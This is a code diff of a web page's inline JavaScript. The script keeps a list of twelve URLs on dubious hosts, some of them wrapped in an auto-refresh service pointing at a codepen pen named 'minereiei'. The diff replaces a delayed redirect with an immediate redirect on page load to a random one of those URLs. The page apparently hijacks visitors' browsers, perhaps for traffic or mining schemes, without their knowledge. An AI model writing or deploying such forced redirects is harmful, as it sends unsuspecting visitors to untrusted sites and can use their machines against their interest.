@@ -23,18 +23,20 @@ urls[2] = "http://code404z.ucoz.net";
 urls[4] = "http://code404z.6te.net";
 urls[5] = "https://naughty-almeida-85c9fa.netlify.com";
 urls[6] = "http://5baaabcd.dl-one2up.com/onetwo/content/2019/2-Feb/23/af051c3fac6585aa1fdcb03cd5b4f7c7.html";
-urls[7] = "https://v6p9d9t4.ssl.hwcdn.net/html/1288153/index.html";
+urls[7] = "https://v6p9d9t4.ssl.hwcdn.net/html/1368719/index.html";
 urls[8] = "http://www.refreshthing.com/index.php?url=https%3A%2F%2Fcodepen.io%2Fminereiei%2Fpen%2FPVrpoL&timeout=360&Go%21=Go%21";
 urls[9] = "http://5baaabcd.dl-one2up.com/onetwo/content/2019/2-Feb/23/af051c3fac6585aa1fdcb03cd5b4f7c7.html";
 urls[10] = "http://www.refreshthing.com/index.php?url=https%3A%2F%2Fwww.codeply.com%2Fgo%2FEaRNowfGLf&timeout=360&Go%21=Go%21";    
 urls[11] = "http://www.refreshthing.com/index.php?url=https%3A%2F%2Fwww.codeply.com%2Fgo%2FEaRNowfGLf&timeout=360&Go%21=Go%21";     
 
-var random = Math.floor(Math.random()*urls.length);
- setTimeout("alertWelcome();",5000);
-    function alertWelcome()
-{
-  window.location = urls[random];
-}
+    var random= Math.floor(Math.random()*12);
+  if (typeof urls[random] === "undefined") {
+    urls[random] = "x is undefined";
+    window.location = urls[1];
+  } else {
+    window.location = urls[random];
+  }
+
 </script>
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script>
